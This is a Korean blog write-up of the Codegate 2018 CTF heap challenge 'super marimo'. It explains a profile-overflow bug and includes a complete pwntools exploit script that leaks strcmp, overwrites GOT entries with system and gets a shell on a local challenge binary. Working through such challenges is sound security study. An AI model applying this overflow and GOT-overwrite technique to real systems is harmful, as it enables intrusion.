---
layout: post
title: ! '[Codegate2018 CTF] super marimo writeup'
excerpt_separator: <!--more-->
tags:
  - CTF
  - Write-up
---

올해 초 CTF에서 열심히 삽질했던 문제...지만 결국 못 풀었다. 최근 h3x0r CTF 문제들을 풀어보면서 힙 문제에 관심이 생겼는데, 갑자기 이 문제가 기억이 나서 서버 한구석에 던져져 있던걸 주섬주섬 꺼내서 풀어보았다. 그래도 그동안 공부한 성과인지 풀 수 있었다 감동 ㅠㅡㅠ

<!--more-->

## 개요

원래 대회에서는 libc도 있었던거같은데 기억 안난다.. 그냥 로컬 환경에서만 익스할 수 있게 했다.

> root@ubuntu:~/CTF/Codegate2018/SuperMarimo.d# file marimo 
>
> marimo: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=45e9b4d54ca35be0defe243f0f8a4982bbac82dc, stripped

64비트 바이너리다. 문제를 분석해보면 마리모를 사고 팔 수 있는 프로그램인데, 처음에 돈이 0원이라서 마리모를 못 산다. 그런데 커맨드를 입력할 때 `show me the marimo`를 입력하면, 치트키처럼 마리모를 하나 공짜로 얻을 수 있다.

## 접근

원래는 `sell marimo` 명령이 인덱스를 검사하지 않고, 해당 영역을 해제하지 않아서 (또는 안에 있는 값이 해제된 값인지 검사하지 않아서) `number of marimo` 카운트가 음수가 될 수 있으며, 마리모 판매시에 주소값을 덮어쓰는 형식으로 GOT & PLT 영역을 덮어쓸 수 있음에 주목했었다. 그러나 값을 leak하기가 어렵고, 정확하게 해당 영역만 조작하기가 꽤 어려워서 그만뒀다.

![]({{ site.baseurl }}/images/KRater/2018-07-03-super-marimo-writeup/pic01.PNG)

그 다음, profile 수정 시에 마리모의 size (*32) 만큼 값을 써줄 수 있는데, 마리모가 시간에 따라 자라기 때문에 쓸 수 있는 값이 점점 증가하는 점에 주목하였다. 마리모는 자라서 프로필 작성을 더 크게 해줄 수 있는데, 영역이 고정되어 있어서 생기는 문제점이다. 해당 취약점을 바탕으로 익스플로잇 코드를 작성하였다.

## 익스플로잇

```python
from pwn import *

global r

PROCESS = "./marimo"
r = process(PROCESS)

def main () :
	r.recvuntil(">> ")

	show_me ("marimo1", "profile1")
	show_me ("vuln", "AAAA")

	sleep(3)

	modify (0, "A"*40 + "B"*8 + "C"*8 + p64(0x603040)*2)
	strcmp_addr = leak()
	system_addr = strcmp_addr - 0x5A1E0
	
	log.info("strcmp : " + hex(strcmp_addr))
	log.info("system : " + hex(system_addr))

	modify(1, p64(system_addr) + p64(system_addr))
	
	r.interactive() # /bin/sh

def modify (index, profile) :
	r.sendline("V")
	r.recvuntil(">> ")
	r.sendline(str(index))
	r.recvuntil(">> ")
	r.sendline("M") # [M]odify
	r.recvuntil(">> ")
	r.sendline(str(profile)) # new profile
	r.recvuntil(">> ")
	r.sendline("B") # [B]ack
	r.recvuntil(">> ")

def leak () :
	r.sendline("V")
	r.recvuntil(">> ")
	r.sendline("1")
	r.recvuntil("name : ")
	data = r.recv(6) + "\x00\x00"

	r.recvuntil(">> ")
	r.sendline("B")
	r.recvuntil(">> ")
	return u64(data)

def buy (size, name, profile) :
	r.sendline("S")
	r.recvuntil(">> ")
	r.sendline(str(size))
	r.recvuntil(">> ")
	r.sendline("P") # [P]ay
	r.recvuntil(">> ")
	r.sendline(str(name))
	r.recvuntil(">> ")
	r.sendline(str(profile))
	r.recvuntil(">> ")

def show_me (name, profile) :
	r.sendline("show me the marimo")
	r.recvuntil(">> ")
	r.sendline(name)
	r.recvuntil(">> ")
	r.sendline(profile)
	r.recvuntil(">> ")
	print ("show me done. id : " + name)

def sell (num) :
	r.sendline("S")
	r.recvuntil(">> ")
	r.sendline(str(num))
	r.recvuntil("?")
	r.sendline("S")
	r.recvuntil(">> ")
	print ("Sell done.")

if __name__ == '__main__' :
	main()

```

재밌는 문제였지만 추후에 출제자분께 여쭤보니 다른 `intended solution`이 있다고 한다.

해당 방법을 사용해서 나중에 다시 풀어봐야 겠다!